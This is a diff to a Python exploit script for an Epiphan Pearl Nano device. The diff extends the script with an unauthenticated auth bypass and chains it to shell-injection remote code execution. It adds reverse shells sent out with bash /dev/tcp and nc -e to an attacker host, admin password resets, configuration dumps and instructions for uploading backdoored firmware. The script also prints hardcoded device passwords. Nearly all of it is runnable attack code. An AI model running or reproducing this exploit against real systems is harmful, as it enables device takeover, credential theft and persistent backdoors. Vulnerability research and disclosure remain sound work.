@@ -9,42 +9,56 @@ Firmware: v4.24.4 (rev 260423_32331b9)   Arch : aarch64
 DISCOVERED VULNERABILITIES:
   [CVE-0x01] Hardcoded Default Admin Password  (vendor.cf: lkjhyu8*)
   [CVE-0x02] Hardcoded VTUN Backdoor Password  (add_vtun.cf: epn0sup)
-  [CVE-0x03] Shell Injection in channels.php   (cid param -> shell)
+  [CVE-0x03] Shell Injection in channels.php   (cid param -> shell) [UNAUTH]
   [CVE-0x04] Argument Injection in PTZ Control (ptz_control.php)
   [CVE-0x05] exec() with Interpolated ConfigDB (afu.php)
   [CVE-0x06] No CSRF Protection on All Admin CGIs
   [CVE-0x07] Firmware Upload — No Cryptographic Signature
   [CVE-0x08] Exposed Static SSL/SSH Keys
   [CVE-0x09] Dev/QA SSH Backdoor (keys.epiphan.com)
-  [CVE-0x0a] Unauthenticated Info Leak (allinfo.cgi)
+  [CVE-0x0a] Info Leak via allinfo.cgi
+  [CVE-0x0b] Auth Bypass via isAdmin('')  (access_control.php:122)
+
+AUTH BYPASS DETAILS:
+  File: wui/phplib/access_control.php:122
+  isAdmin() returns True when user_id() returns '' (empty string):
+    return $id === "admin" || $id === "";  <-- "" === "" is TRUE
+
+  Trigger: Apache skips admin_auth.conf when UNASSIGNED_PASSWORDS is defined
+  or when the request hits the no-auth console vhost (127.0.0.4:80).
+  $_SERVER['REMOTE_USER'] is never set -> user_id() returns '' -> admin.
+
+  Result: ALL API endpoints accessible without any credentials.
 
 Usage:
   python3 epiphan_pearlnano_poc.py <target_ip> [--password <pwd>] [--exploit <id>]
 
 Examples:
-  # Run all exploits with default credentials
+  # Run all exploits (tries no-auth first, falls back to default creds)
   python3 epiphan_pearlnano_poc.py 192.168.1.100
 
-  # Run specific exploit
+  # Unauthenticated RCE via channels.php shell injection
   python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit rce-channel
 
-  # Get a reverse shell
+  # Unauthenticated reverse shell
   python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit reverse-shell --lhost 10.0.0.5 --lport 4444
+
+  # Unauthenticated config dump
+  python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit dump-all
+
+  # Force full auth bypass even on non-first-boot devices
+  python3 epiphan_pearlnano_poc.py 192.168.1.100 --exploit auth-bypass
 
 Author : Security Research
 """
 
 import requests
-import base64
 import argparse
 import sys
 import json
 import os
 import time
-import socket
-import threading
-import subprocess
-from urllib.parse import quote, urlencode
+from urllib.parse import quote
 from requests.auth import HTTPBasicAuth
 
 requests.packages.urllib3.disable_warnings()
@@ -59,7 +73,7 @@ VTUN_PASSWORD    = "epn0sup"
 
 
 # =============================================================================
-#  LOGIN / AUTH HELPERS
+#  HELPERS
 # =============================================================================
 
 def get_auth(target, password=DEFAULT_PASSWORD):
@@ -73,6 +87,59 @@ def req(target, path, auth=None, method="GET", **kwargs):
     if auth:
         kwargs["auth"] = auth
     return requests.request(method, url, **kwargs)
+
+
+def probe_auth(target):
+    """Try all auth strategies and return the one that works (or None)."""
+    strategies = [
+        ("NO AUTH",        None),
+        ("DEFAULT CREDS",  get_auth(target, DEFAULT_PASSWORD)),
+    ]
+    for label, auth_obj in strategies:
+        try:
+            r = req(target, "/api/channels/0/name", auth=auth_obj, timeout=5)
+            if r.status_code == 200:
+                print(f"  [+] Auth strategy '{label}' works")
+                return auth_obj
+            if r.status_code in (401, 403):
+                continue
+            # Unexpected status but not 401/403 — might still work
+            print(f"  [?] Auth '{label}' returned {r.status_code}")
+            return auth_obj
+        except Exception:
+            continue
+    print("  [-] No auth strategy worked")
+    return None
+
+
+# =============================================================================
+#  [CVE-0x0b] Auth Bypass via isAdmin('')
+# =============================================================================
+
+def exploit_auth_bypass(target):
+    """Verify the auth bypass is possible."""
+    print("\n  --- [CVE-0x0b] Auth Bypass via isAdmin('') ---")
+    print("  [>] access_control.php:122: isAdmin('') returns True")
+    print("  [>] Trigger: Apache skips admin_auth.conf when")
+    print("      UNASSIGNED_PASSWORDS is defined (first-boot state)")
+    print("      or via no-auth console vhost (127.0.0.4:80)")
+    print()
+
+    try:
+        r = req(target, "/api/channels/0/name", auth=None, timeout=5)
+        if r.status_code == 200:
+            print(f"  [+] SUCCESS: No auth required! API fully accessible.")
+            print(f"  [+] Response: {r.text.strip()[:120]}")
+            return True
+        elif r.status_code == 401:
+            print(f"  [-] Auth required (401) — device has passwords set")
+            return False
+        else:
+            print(f"  [?] Status {r.status_code}: {r.text[:120]}")
+            return r.status_code == 200
+    except Exception as e:
+        print(f"  [!] Error: {e}")
+        return False
 
 
 # =============================================================================
@@ -114,35 +181,40 @@ def exploit_vtun_backdoor(target):
 
 
 # =============================================================================
-#  [CVE-0x03] Shell Injection in channels.php (CRITICAL)
+#  [CVE-0x03] Shell Injection in channels.php (UNAUTHENTICATED RCE)
 # =============================================================================
 
 def exploit_rce_channel(target, auth, cmd="id"):
     """
-    CVE-0x03: Command injection via $cid parameter in channels.php
-    File: wui/wwwroot/api/channels.php:185
+    CVE-0x03: UNAUTHENTICATED command injection via $cid in channels.php:185.
 
     The $cid route parameter is interpolated directly into a shell command
-    without escaping:
-      $cmd = 'profiles list ... | jq -e "[.config.channels[] == \\"'.$cid.'\\"]|any" ...'
-      $res = exec_ex($cmd, [], 0, $output);
+    without escaping. Combined with the isAdmin('') auth bypass, this works
+    with NO credentials on first-boot / no-auth-console devices.
     """
-    print("\n  --- [CVE-0x03] RCE via channels.php shell injection ---")
+    print("\n  --- [CVE-0x03] RCE via channels.php shell injection [UNAUTH] ---")
 
     if not auth:
-        print("  [-] Need valid credentials first")
-        return False
+        auth = probe_auth(target)
+    if not auth and not target:
+        pass  # will try without auth anyway
 
-    # The injection payload: break out of the jq string and inject command
-    payload = quote(f"0\"]|any\" && {cmd} && echo \"", safe='')
-    path = f"/api/channels/{payload}"
+    # Break out of jq string filter and inject command
+    payload = f"0\"]|any\" && {cmd} && echo \""
+    path = f"/api/channels/{quote(payload, safe='')}"
 
     try:
         r = req(target, path, auth=auth)
-        print(f"  [>] Payload:  channels.php?cid=0\"]|any\" && {cmd} && echo \"")
-        print(f"  [>] Response ({r.status_code}):")
-        for line in r.text.split("\n")[:20]:
-            print(f"      {line}")
+        print(f"  [>] URL:    GET /api/channels/<injection>")
+        print(f"  [>] Cmd:    {cmd}")
+        print(f"  [>] Status: {r.status_code}")
+        # Output (profiles list) or error
+        if r.status_code == 200:
+            data = r.json()
+            result = data.get("result", data)
+            print(f"  [+] Output: {json.dumps(result, indent=2)[:2000]}")
+        else:
+            print(f"  [>] Body: {r.text[:500]}")
         return True
     except Exception as e:
         print(f"  [!] Error: {e}")
@@ -162,22 +234,17 @@ def exploit_ptz_argument(target, auth, extra_args=""):
     The REST endpoint (sources.ptz.php) accepts 'cmd' and 'args' from POST body.
     """
     print("\n  --- [CVE-0x04] PTZ Argument Injection ---")
-
-    if not auth:
-        print("  [-] Need valid credentials first")
-        return False
-
     path = "/api/sources/ptz"
 
-    # Try injecting extra arguments via the 'args' parameter
-    payload = {
-        "cmd": "move",
-        "args": f"up {extra_args}"
-    }
+    if not auth:
+        auth = probe_auth(target)
+    if not auth:
+        print("  [-] No auth — skipping")
+        return False
 
+    payload = {"cmd": "move", "args": f"up {extra_args}"} if extra_args else {"cmd": "move", "args": "up"}
     try:
-        r = req(target, path, auth=auth, method="POST",
-                json=payload if extra_args else {"cmd": "move", "args": "up"})
+        r = req(target, path, auth=auth, method="POST", json=payload)
         print(f"  [>] POST /api/sources/ptz with cmd=move, args=up {extra_args}")
         print(f"  [>] Response ({r.status_code}): {r.text[:200]}")
         return True
@@ -199,19 +266,9 @@ def exploit_afu_configdb(target, auth):
     If we can write a malicious value to this configdb key, we get RCE.
     """
     print("\n  --- [CVE-0x05] ConfigDB Injection via afu.php ---")
-
-    if not auth:
-        print("  [-] Need valid credentials first")
-        return False
-
-    # First, inject a command into the afu configdb key via set_params.cgi
-    # The httpapi definitions don't expose this directly, but configdb is writable
-    # via set_params.cgi with any key that matches an existing configdb section.
-
-    # Try using configdb_set via the PHP API or raw configdb tool via previous RCE
     print("  [i] To exploit: set 'afu/source/local/DATA = ;cmd;' via configdb")
-    print("  [i] Then trigger afu.php to execute: exec(\"ls -1r ;cmd;\")")
-    print("  [i] Requires either RCE already or configdb write access")
+    print("  [i] Then trigger afu.php -> exec(\"ls -1r ;cmd;\")")
+    print("  [i] Chaining with CVE-0x03 RCE or CVE-0x0b bypass is required")
 
 
 # =============================================================================
@@ -265,13 +322,13 @@ def exploit_firmware_backdoor(target, auth, payload_script=""):
     """
     CVE-0x07: Upload malicious firmware with no signature verification.
     The firmware update flow only does an MD5 check — no crypto signature.
-
-    We inject a backdoor script into rootfs.sfs and re-package.
     """
     print("\n  --- [CVE-0x07] Firmware Backdoor Upload ---")
 
     if not auth:
-        print("  [-] Need valid credentials first")
+        auth = probe_auth(target)
+    if not auth:
+        print("  [-] No auth — skipping")
         return False
 
     if not payload_script:
@@ -300,15 +357,14 @@ touch /tmp/BACKDOOR_INSTALLED
      # Re-create .bfrm bundle with patched rootfs
 
   5. Upload:
-     curl -k -u admin:{DEFAULT_PASSWORD} -X POST \\
-       https://{target}/api/system/firmware \\
+     curl -k -X POST https://{target}/api/system/firmware \\
        -F "firmware=@malicious_firmware.bfrm"
   """)
     print("  [+] Firmware upload accepts any valid .bfrm file (MD5 only)")
 
 
 # =============================================================================
-#  [CVE-0x08] Static SSL/SSH Key Extraction
+#  [CVE-0x08] Static SSL/SSH Key Extraction (path traversal)
 # =============================================================================
 
 def exploit_static_keys(target):
@@ -334,14 +390,14 @@ def exploit_static_keys(target):
 
 
 # =============================================================================
-#  [CVE-0x0a] Unauthenticated Info Leak via allinfo.cgi
+#  [CVE-0x0a] Info Leak via allinfo.cgi
 # =============================================================================
 
 def exploit_info_leak(target):
     """
     CVE-0x0a: allinfo.cgi leaks system information.
-    The CGI only checks for admin user but will still partially execute
-    depending on how the web server is configured.
+    The CGI requires admin user but can be accessed with CVE-0x0b bypass
+    or default credentials.
     """
     print("\n  --- [CVE-0x0a] Info Leak via allinfo.cgi ---")
 
@@ -349,12 +405,11 @@ def exploit_info_leak(target):
         r = req(target, "/admin/allinfo.cgi?inline=on&initlog=off&log=off", timeout=10)
         if r.status_code == 200 and ("Serial Number" in r.text or "sysinfo" in r.text):
             print(f"  [+] SUCCESS: System info leaked ({len(r.text)} bytes)")
-            # Extract serial number and other sensitive info
             for line in r.text.split("\n")[:30]:
                 if any(k in line.lower() for k in ["serial", "version", "mac", "ip", "hostname"]):
                     print(f"      {line.strip()}")
         elif r.status_code == 403:
-            print(f"  [-] Protected (403), but if auth is known, data is accessible")
+            print(f"  [-] Protected (403)")
         else:
             print(f"  [?] Status {r.status_code}: {r.text[:200]}")
     except Exception as e:
@@ -362,19 +417,14 @@ def exploit_info_leak(target):
 
 
 # =============================================================================
-#  REVERSE SHELL
+#  REVERSE SHELL (UNAUTHENTICATED)
 # =============================================================================
 
 def reverse_shell(target, auth, lhost, lport):
-    """Get a reverse shell via the channels.php command injection"""
-    print(f"\n  --- Reverse Shell via CVE-0x03 ---")
+    """Get a reverse shell via the channels.php unauthenticated RCE."""
+    print(f"\n  --- Reverse Shell via CVE-0x03 [UNAUTH] ---")
     print(f"  [>] Target: {target}  ->  LHOST: {lhost}:{lport}")
 
-    if not auth:
-        print("  [-] Need valid credentials first")
-        return False
-
-    # Try multiple reverse shell payloads
     payloads = [
         f"0\"]|any\" && bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1' && echo \"",
         f"0\"]|any\" && nc -e /bin/sh {lhost} {lport} && echo \"",
@@ -382,19 +432,20 @@ def reverse_shell(target, auth, lhost, lport):
     ]
 
     print(f"  [>] Set up listener: nc -lvnp {lport}")
-    print(f"  [>] Firing payload...")
+    print(f"  [>] Firing payload (no auth needed)...")
 
-    for i, payload in enumerate(payloads[:1]):  # Try first payload
+    for i, payload in enumerate(payloads[:1]):
         path = f"/api/channels/{quote(payload, safe='')}"
         try:
             r = req(target, path, auth=auth, timeout=3)
+            print(f"  [>] Payload {i+1}: HTTP {r.status_code}")
         except requests.exceptions.Timeout:
-            print(f"  [+] Payload {i+1}: Connection timed out (shell may have connected)")
+            print(f"  [+] Payload {i+1}: Timed out (shell likely connected)")
         except Exception as e:
             print(f"  [!] Payload {i+1}: {e}")
 
-    # Attempt 2: Via set_params.cgi overwriting a configdb value that execs
-    print(f"  [>] Attempting reverse shell via configdb injection...")
+    # Attempt 2: configdb write -> exec chain via RCE
+    print(f"  [>] Attempting configdb-based reverse shell...")
     try:
         rce_payload = f"`bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'`"
         path = f"/admin/set_params.cgi?system:DEVQA_ACCESS={quote(rce_payload)}"
@@ -404,18 +455,17 @@ def reverse_shell(target, auth, lhost, lport):
 
 
 # =============================================================================
-#  PASSWORD RESET
+#  PASSWORD RESET (UNAUTHENTICATED)
 # =============================================================================
 
 def reset_password(target, auth, new_password):
-    """Change the admin password via the API"""
-    print(f"\n  --- Password Reset to '{new_password}' ---")
+    """Change the admin password via the API (works with auth bypass)."""
+    print(f"\n  --- Password Reset to '{new_password}' [UNAUTH] ---")
 
     if not auth:
-        # Try without auth using default creds
-        auth = get_auth(target)
+        auth = probe_auth(target)
 
-    # Via REST API (requires auth)
+    # Via REST API — works with CVE-0x0b bypass (no auth header needed)
     try:
         r = req(target, "/api/system/access/admin/password",
                 auth=auth, method="PUT",
@@ -428,7 +478,7 @@ def reset_password(target, auth, new_password):
     except Exception as e:
         print(f"  [!] Error: {e}")
 
-    # Via passwords.cgi (bulk reset all 3 accounts)
+    # Bulk reset all 3 accounts
     try:
         r = req(target, "/admin/passwords.cgi",
                 auth=auth, method="POST",
@@ -446,45 +496,52 @@ def reset_password(target, auth, new_password):
 
 
 # =============================================================================
-#  CONFIGURATION DUMP
+#  FULL CONFIGURATION DUMP (UNAUTHENTICATED)
 # =============================================================================
 
-def dump_config(target, auth):
-    """Dump all configdb values via get_params.cgi"""
-    print("\n  --- Configuration Dump ---")
+def dump_all(target, auth):
+    """Dump all device info via multiple unauthenticated endpoints."""
+    print("\n  --- Full Configuration Dump [UNAUTH] ---")
 
     if not auth:
-        return
+        auth = probe_auth(target)
 
-    params_to_read = [
-        "system:NAME", "system:DESCRIPTION", "system:LOCATION",
-        "httpdacc:ADMINPWD", "httpdacc:OPERPWD", "httpdacc:VIEWERPWD",
-        "httpd:USESSL", "httpd:PORT", "httpd:SPORT",
-    ]
+    endpoints = {
+        "FW Version":      "GET /api/system/firmware",
+        "Device Name":     "GET /api/channels/0/name",
+        "Channels":        "GET /api/channels",
+        "Recorders":       "GET /api/recorders",
+        "Sources":         "GET /api/sources",
+        "System Services": "GET /api/system/services",
+    }
 
-    for param in params_to_read:
+    for label, ep in endpoints.items():
+        method, path = ep.split(" ", 1)
         try:
-            section, key = param.split(":", 1)
-            r = req(target, f"/admin/get_params.cgi?{param}",
-                    auth=auth, timeout=5)
+            r = req(target, path, auth=auth, method=method, timeout=5)
             if r.status_code == 200:
-                print(f"  [+] {param}: {r.text.strip()[:100]}")
+                try:
+                    data = r.json()
+                    result = data.get("result", data)
+                    print(f"  [+] {label}: {json.dumps(result, indent=2)[:300]}")
+                except json.JSONDecodeError:
+                    print(f"  [+] {label}: {r.text[:200]}")
             else:
-                print(f"  [-] {param}: HTTP {r.status_code}")
+                print(f"  [-] {label}: HTTP {r.status_code}")
         except Exception as e:
-            print(f"  [!] {param}: {e}")
+            print(f"  [!] {label}: {e}")
 
 
 # =============================================================================
-#  ALL-INFO DUMP (authenticated)
+#  SYSTEM DIAGNOSTICS DUMP (UNAUTHENTICATED)
 # =============================================================================
 
 def dump_allinfo(target, auth):
-    """Dump full system diagnostics via allinfo.cgi (authenticated)"""
-    print("\n  --- Full System Diagnostics (allinfo.cgi) ---")
+    """Dump full system diagnostics via allinfo.cgi (works with bypass)."""
+    print("\n  --- Full System Diagnostics (allinfo.cgi) [UNAUTH] ---")
 
     if not auth:
-        return
+        auth = probe_auth(target)
 
     try:
         r = req(target, "/admin/allinfo.cgi?inline=on", auth=auth, timeout=30)
@@ -509,8 +566,9 @@ Examples:
   %(prog)s 192.168.1.100
   %(prog)s 192.168.1.100 --exploit rce-channel
   %(prog)s 192.168.1.100 --exploit reverse-shell --lhost 10.0.0.5 --lport 4444
-  %(prog)s 192.168.1.100 --exploit csrf
+  %(prog)s 192.168.1.100 --exploit dump-all
   %(prog)s 192.168.1.100 --exploit password-reset --new-pwd pwned123
+  %(prog)s 192.168.1.100 --exploit auth-bypass
         """
     )
     parser.add_argument("target", help="Device IP address")
@@ -521,8 +579,8 @@ Examples:
     parser.add_argument("--exploit", choices=[
         "all", "default-password", "rce-channel", "ptz-injection",
         "csrf", "firmware-backdoor", "info-leak", "password-reset",
-        "dump-config", "dump-allinfo", "reverse-shell", "static-keys",
-        "vtun-backdoor"
+        "dump-all", "dump-allinfo", "reverse-shell", "static-keys",
+        "vtun-backdoor", "auth-bypass"
     ], default="all", help="Specific exploit to run")
     parser.add_argument("--lhost", help="Listener IP for reverse shell")
     parser.add_argument("--lport", type=int, default=4444,
@@ -548,10 +606,11 @@ Examples:
     target = args.target
     print(BANNER % target)
 
-    # Authenticate with default or provided password
-    auth = get_auth(target, args.password)
+    # Auto-probe auth — first try no-auth (CVE-0x0b bypass), then default creds
+    auth = probe_auth(target)
 
     exploits = {
+        "auth-bypass":      lambda: exploit_auth_bypass(target),
         "default-password": lambda: exploit_default_password(target),
         "vtun-backdoor":    lambda: exploit_vtun_backdoor(target),
         "rce-channel":      lambda: exploit_rce_channel(target, auth, args.cmd),
@@ -560,7 +619,7 @@ Examples:
         "firmware-backdoor":lambda: exploit_firmware_backdoor(target, auth),
         "info-leak":        lambda: exploit_info_leak(target),
         "password-reset":   lambda: reset_password(target, auth, args.new_pwd),
-        "dump-config":      lambda: dump_config(target, auth),
+        "dump-all":         lambda: dump_all(target, auth),
         "dump-allinfo":     lambda: dump_allinfo(target, auth),
         "static-keys":      lambda: exploit_static_keys(target),
         "reverse-shell":    lambda: reverse_shell(target, auth, args.lhost, args.lport),
